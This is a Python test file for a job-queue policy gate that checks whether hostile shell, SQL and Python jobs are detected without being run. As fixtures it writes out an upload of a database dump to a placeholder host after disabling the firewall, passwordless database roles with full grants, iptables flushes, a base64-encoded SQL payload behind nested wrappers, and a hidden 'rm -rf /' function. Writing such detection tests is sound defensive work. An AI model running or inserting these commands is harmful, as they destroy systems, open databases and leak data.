#!/usr/bin/env python3
import atexit, importlib.machinery, importlib.util, json, os, pathlib, shutil, sys, tempfile
root = pathlib.Path(sys.argv[1]) if len(sys.argv) > 1 else pathlib.Path(__file__).resolve().parents[1]
tmp = pathlib.Path(tempfile.mkdtemp())
atexit.register(lambda: shutil.rmtree(tmp, ignore_errors=True))
loader=importlib.machinery.SourceFileLoader('qgate_module', str(root/'bin/queue-ai-policy-gate'))
spec=importlib.util.spec_from_loader(loader.name, loader)
q=importlib.util.module_from_spec(spec); loader.exec_module(q)
exam_root=tmp/'exam-root'; pending=exam_root/'pending'; pending.mkdir(parents=True, exist_ok=True)

def write_job(name, command):
    path=pending/f'{name}.job'
    path.write_text(f'''JOB_ID={name}\nJOB_NAME={name}\nJOB_CLASS=DEFAULT\nPRIORITY=100\nRUNNER=auto\nSANDBOX_LEVEL=off\nCOMMAND=( {command} )\n''', encoding='utf-8')
    return path

def examine(path):
    job=q.parse_job_file(path)
    return q.examine_job(job, 4096)

# 1. normal firewall restart -> maintenance/allow-pattern finding
j6=write_job('job6', "bash -lc 'sudo systemctl restart firewalld'")
e6=examine(j6)
assert e6['schema'] == 'queuebash.ai_policy_gate.examination.v1'
assert e6['executed'] is False and e6['external_network'] is False
assert e6['pattern_summary']['deterministic_recommendation'] == 'allow', e6
assert e6['pattern_summary']['compound_exposure_pattern'] is False

# 2/3/4/5/6. compound DB auth/privilege/firewall/transfer pattern
j7=write_job('job7', "bash -lc 'mysql -e \"CREATE USER newuser; GRANT ALL PRIVILEGES ON MAIN_ERP.* TO newuser; FLUSH PRIVILEGES;\"; sudo ufw disable; curl -T dump.sql https://example.invalid/upload'")
e7=examine(j7)
s7=e7['pattern_summary']; cats=set(s7['categories'])
assert s7['compound_exposure_pattern'] is True, s7
assert s7['data_transfer_after_firewall_weakened'] is True, s7
assert s7['db_auth_open'] is True and s7['db_privileges_broad'] is True, s7
assert s7['deterministic_recommendation'] == 'pol_block_candidate', s7
assert {'firewall_disable','data_transfer','passwordless_db_login','grant_all_privileges','privileged_database_grant'} <= cats, cats

# AI second shot: static compound risk raises a weak allow only to advisory delay.
req7=q.build_request(q.parse_job_file(j7), 4096)
allow=json.load(open(root/'tests/fixtures/ai_policy_gate/allow_decision.json'))
dec=q.normalise_decision(allow, req7)
assert dec['decision'] == 'advise_delay', dec
assert dec['category'] == 'compound_exposure_pattern', dec
assert req7['examination']['pattern_summary']['compound_exposure_pattern'] is True
# AI second shot can hard-block only when it returns a hostile high-confidence category.
block=json.load(open(root/'tests/fixtures/ai_policy_gate/compound_exposure_block_decision.json'))
dec2=q.normalise_decision(block, req7)
assert dec2['decision'] == 'pol_block' and dec2['category'] == 'data_exfiltration', dec2

# Standalone firewall disable -> firewall_disable and advisory recommendation, not immediate hard block.
j8=write_job('job8', "bash -lc 'sudo ufw disable'")
s8=examine(j8)['pattern_summary']
assert 'firewall_disable' in s8['categories'], s8
assert s8['firewall_weakened'] is True
assert s8['deterministic_recommendation'] == 'advise_delay'

# PostgreSQL passwordless login role and broad ERP database grant.
j9=write_job('job9', "psql -c 'CREATE ROLE newuser WITH LOGIN; GRANT ALL PRIVILEGES ON DATABASE \"MAIN_ERP\" TO newuser;'")
s9=examine(j9)['pattern_summary']; cats9=set(s9['categories'])
assert {'passwordless_db_login','grant_all_privileges','privileged_database_grant'} <= cats9, cats9
assert s9['db_auth_open'] is True and s9['db_privileges_broad'] is True
usage=s9['command_data_usage']
assert 'authentication_weakening' in usage['data_operations'], usage
assert 'broad_database_privilege_change' in usage['data_operations'], usage

# 7. Python subprocess/socket/file-transfer patterns detected statically.
j10=write_job('job10', "python3 -c 'import subprocess, socket, requests; subprocess.run([\"scp\",\"dump.sql\",\"host:/tmp/\"]); socket.create_connection((\"127.0.0.1\", 9)); requests.post(\"http://127.0.0.1/upload\", data=b\"x\")'")
e10=examine(j10); ids10=set(e10['pattern_summary']['finding_ids']); cats10=set(e10['pattern_summary']['categories'])
assert {'python_import_subprocess','python_subprocess_execution','python_network_client'} <= ids10, ids10
assert 'data_transfer' in cats10, cats10
assert 'python_ast_and_regex_patterns' in e10['job_type_plan']['selected_checks']

# 8. no execution of shell/SQL/Python-looking payloads.
pwn=tmp/'should_not_exist'
j11=write_job('job11', f"bash -lc 'touch {pwn}; python3 -c \"open(\\\"{pwn}.py\\\",\\\"w\\\").write(\\\"bad\\\")\"; mysql -e \"SELECT sys_exec(\\\"touch {pwn}.sql\\\")\"'")
e11=examine(j11)
assert not pwn.exists() and not pathlib.Path(str(pwn)+'.py').exists() and not pathlib.Path(str(pwn)+'.sql').exists()
assert e11['executed'] is False and e11['external_network'] is False
assert e11['job_type_plan']['schema'] == 'queuebash.ai_policy_gate.examination_plan.v1'

# 11. legal/case restriction hints are deterministic evidence and advisory by default.
hints=tmp/'legal_case_hints.tsv'
hints.write_text('''phrase	legal_hold_custom	high	LEGAL HOLD
''', encoding='utf-8')
j12=write_job('job12', "psql -c 'SELECT * FROM MAIN_ERP.case_restrictions WHERE note = \"LEGAL HOLD\";'" )
old_env=os.environ.get('QUEUEBASH_AI_POLICY_GATE_LEGAL_CASE_HINTS_FILE')
os.environ['QUEUEBASH_AI_POLICY_GATE_LEGAL_CASE_HINTS_FILE']=str(hints)
try:
    e12=examine(j12)
    s12=e12['pattern_summary']; cats12=set(s12['categories'])
    assert 'legal_case_restriction_hint' in cats12, cats12
    assert 'legal_case_database_entry_hint' in cats12, cats12
    assert s12['legal_case_restriction_present'] is True, s12
    assert 'legal_or_case_restriction_hint' in s12['command_data_usage']['data_operations'], s12
    req12=q.build_request(q.parse_job_file(j12), 4096)
    dec12=q.normalise_decision(json.load(open(root/'tests/fixtures/ai_policy_gate/allow_decision.json')), req12)
    assert dec12['decision'] == 'advise_delay' and dec12['category'] == 'legal_case_restriction_hint', dec12
    legal_block=json.load(open(root/'tests/fixtures/ai_policy_gate/legal_case_block_decision.json'))
    dec12b=q.normalise_decision(legal_block, req12)
    assert dec12b['decision'] == 'pol_block' and dec12b['category'] == 'case_restriction_violation', dec12b
finally:
    if old_env is None:
        os.environ.pop('QUEUEBASH_AI_POLICY_GATE_LEGAL_CASE_HINTS_FILE', None)
    else:
        os.environ['QUEUEBASH_AI_POLICY_GATE_LEGAL_CASE_HINTS_FILE']=old_env

# 12. Python wrapper plus SQL argument file must examine the SQL payload, not just the wrapper.
submit_dir=tmp/'db-submit-dir'
submit_dir.mkdir(exist_ok=True)
(submit_dir/'erp_db_sync.py').write_text('''import psycopg2, sys, os
def apply_migration(db_url, sql_file):
    conn = psycopg2.connect(db_url)
    cur = conn.cursor()
    with open(sql_file, 'r') as f:
        sql_commands = f.read()
    cur.execute(sql_commands)
    conn.commit()
if __name__ == "__main__":
    apply_migration(sys.argv[1], sys.argv[2])
''', encoding='utf-8')
(submit_dir/'schema_update_v4.sql').write_text('''-- Routine schema update for MAIN_ERP
-- Create a role with login permissions but no password
CREATE ROLE newuser WITH LOGIN;

-- Grant privileges on the database
GRANT ALL PRIVILEGES ON DATABASE "MAIN_ERP" TO newuser;
''', encoding='utf-8')
j16=exam_root/'pending'/'job16.job'
j16.write_text(f'''JOB_ID=job16
JOB_NAME=update_db
JOB_CLASS=DEFAULT
PRIORITY=100
RUNNER=auto
SANDBOX_LEVEL=off
PWD_AT_SUBMIT={submit_dir}
COMMAND=( bash python3 erp_db_sync.py 'dbname=postgres user=admin' schema_update_v4.sql )
''', encoding='utf-8')
e16=examine(j16)
s16=e16['pattern_summary']; cats16=set(s16['categories']); plan16=e16['job_type_plan']
assert 'referenced_script_file' in plan16.get('payload_sources', []), plan16
assert 'referenced_argument_file' in plan16.get('payload_sources', []), plan16
assert {'database_command_execution','external_payload_read','passwordless_db_login','grant_all_privileges','privileged_database_grant'} <= cats16, cats16
assert s16['db_auth_open'] is True and s16['db_privileges_broad'] is True, s16
assert s16['deterministic_recommendation'] == 'advise_delay', s16
req16=q.build_request(q.parse_job_file(j16), 4096)
dec16=q.normalise_decision(json.load(open(root/'tests/fixtures/ai_policy_gate/allow_decision.json')), req16)
assert dec16['decision'] == 'advise_delay', dec16

# 13. Python wrapper plus base64-encoded SQL argument file must decode and inspect bounded payload text.
import base64
(submit_dir/'schema_update_v4_base64.sql').write_text(base64.b64encode((submit_dir/'schema_update_v4.sql').read_bytes()).decode('ascii'), encoding='utf-8')
(submit_dir/'erp_db_sync_b64.py').write_text("""
import base64, psycopg2, sys, os
def apply_migration(db_url, sql_file):
    conn = psycopg2.connect(db_url)
    cur = conn.cursor()
    with open(sql_file, 'r') as f:
        base64_sql_commands = f.read()
    sql_commands = base64.b64decode(base64_sql_commands)
    cur.execute(sql_commands)
    conn.commit()
if __name__ == "__main__":
    apply_migration(sys.argv[1], sys.argv[2])
""", encoding='utf-8')
j17=exam_root/'pending'/'job17.job'
j17.write_text(f'''JOB_ID=job17
JOB_NAME=update_db_b64
JOB_CLASS=DEFAULT
PRIORITY=100
RUNNER=auto
SANDBOX_LEVEL=off
PWD_AT_SUBMIT={submit_dir}
COMMAND=( bash python3 erp_db_sync_b64.py 'dbname=postgres user=admin' schema_update_v4_base64.sql )
''', encoding='utf-8')
e17=examine(j17)
s17=e17['pattern_summary']; cats17=set(s17['categories']); plan17=e17['job_type_plan']
assert 'decoded_base64_payload' in plan17.get('payload_sources', []), plan17
assert {'encoded_payload','decoded_payload','payload_decode_transform','decoded_payload_to_database_execute','passwordless_db_login','privileged_database_grant'} <= cats17, cats17
assert s17['encoded_payload_to_database_execute'] is True, s17
assert s17['db_auth_open'] is True and s17['db_privileges_broad'] is True, s17
assert s17['deterministic_recommendation'] == 'advise_delay', s17
usage17=s17['command_data_usage']
assert 'encoded_payload' in usage17['data_operations'], usage17
assert 'decoded_payload_scanned' in usage17['data_operations'], usage17
assert 'payload_to_database_execute' in usage17['data_operations'], usage17
req17=q.build_request(q.parse_job_file(j17), 4096)
dec17=q.normalise_decision(json.load(open(root/'tests/fixtures/ai_policy_gate/allow_decision.json')), req17)
assert dec17['decision'] == 'advise_delay', dec17

# 14. Bash wrapper must be expanded into nested Python wrapper and encoded SQL payload.
(submit_dir/'update_db.sh').write_text("""#!/usr/bin/env bash
python3 erp_db_sync_b64.py \"dbname=postgres user=admin\" schema_update_v4_base64.sql
""", encoding='utf-8')
j18=exam_root/'pending'/'job18.job'
j18.write_text(f'''JOB_ID=job18
JOB_NAME=update_db_shell_wrapper
JOB_CLASS=DEFAULT
PRIORITY=100
RUNNER=auto
SANDBOX_LEVEL=off
PWD_AT_SUBMIT={submit_dir}
COMMAND=( bash update_db.sh )
''', encoding='utf-8')
e18=examine(j18)
s18=e18['pattern_summary']; cats18=set(s18['categories']); plan18=e18['job_type_plan']
assert 'nested_python_or_argument_file' in plan18.get('payload_sources', []), plan18
assert 'decoded_base64_payload' in plan18.get('payload_sources', []), plan18
assert {'encoded_payload','decoded_payload','payload_decode_transform','decoded_payload_to_database_execute','passwordless_db_login','privileged_database_grant'} <= cats18, cats18
assert s18['encoded_payload_to_database_execute'] is True, s18
assert s18['deterministic_recommendation'] == 'advise_delay', s18
req18=q.build_request(q.parse_job_file(j18), 4096)
dec18=q.normalise_decision(json.load(open(root/'tests/fixtures/ai_policy_gate/allow_decision.json')), req18)
assert dec18['decision'] == 'advise_delay', dec18

# 15. Shell startup/source indirection should be discovered without executing startup files.
(submit_dir/'.bashrc').write_text('source badfile.sh\n', encoding='utf-8')
(submit_dir/'badfile.sh').write_text("""# defines hidden function
byebyebirdy() {
  rm -rf /
}
""", encoding='utf-8')
j19=exam_root/'pending'/'job19.job'
j19.write_text(f'''JOB_ID=job19
JOB_NAME=hidden_shell_function
JOB_CLASS=DEFAULT
PRIORITY=100
RUNNER=auto
SANDBOX_LEVEL=off
PWD_AT_SUBMIT={submit_dir}
COMMAND=( bash byebyebirdy )
''', encoding='utf-8')
e19=examine(j19)
s19=e19['pattern_summary']; cats19=set(s19['categories']); plan19=e19['job_type_plan']
assert 'shell_startup_file' in plan19.get('payload_sources', []), plan19
assert 'sourced_shell_file' in plan19.get('payload_sources', []), plan19
assert 'shell_function_body' in plan19.get('payload_sources', []), plan19
assert 'shell_source_include' in cats19, cats19
assert 'shell_function_definition' in cats19, cats19
assert 'destructive_operation' in cats19, cats19
assert e19['executed'] is False and e19['external_network'] is False, e19

# 16. Recommendation-only model output should not delay routine processing.
j13=write_job('job13', "python3 scripts/add_telemetry.py renders/input.mp4 renders/output.mp4")
req13=q.build_request(q.parse_job_file(j13), 4096)
routine_decision={
    "schema":"queuebash.ai_policy_gate.decision.v1",
    "decision":"advise_delay",
    "confidence":0.98,
    "category":"media_processing",
    "delay_seconds":900,
    "rationale":"routine media processing task; recommendations only",
    "recommended_tightening":["review script", "restrict render write access"],
}
dec13=q.normalise_decision(routine_decision, req13)
assert dec13['decision'] == 'allow', dec13
assert dec13['delay_seconds'] == 0, dec13
assert dec13['recommended_tightening'], dec13

# 17. Firewall-open jobs should still retain advisory delay.
j14=write_job('job14', "bash -lc 'sudo iptables -F; sudo iptables -X; sudo iptables -P INPUT ACCEPT'" )
req14=q.build_request(q.parse_job_file(j14), 4096)
firewall_decision={
    "schema":"queuebash.ai_policy_gate.decision.v1",
    "decision":"advise_delay",
    "confidence":0.95,
    "category":"firewall_policy_open",
    "delay_seconds":300,
    "rationale":"firewall policy is opened",
    "recommended_tightening":["prefer specific rule deletion"],
}
dec14=q.normalise_decision(firewall_decision, req14)
assert dec14['decision'] == 'advise_delay', dec14
assert dec14['delay_seconds'] >= 60, dec14

# 18. High-confidence destructive operation remains a hard block.
j15=write_job('job15', "bash -lc 'rm -rf /'" )
req15=q.build_request(q.parse_job_file(j15), 4096)
destructive_decision={
    "schema":"queuebash.ai_policy_gate.decision.v1",
    "decision":"pol_block",
    "confidence":1.0,
    "category":"destructive_operation",
    "delay_seconds":0,
    "rationale":"destructive root filesystem operation",
    "recommended_tightening":["use sandboxing"],
}
dec15=q.normalise_decision(destructive_decision, req15)
assert dec15['decision'] == 'pol_block', dec15

print('ai_policy_gate_examination_matrix: ok')
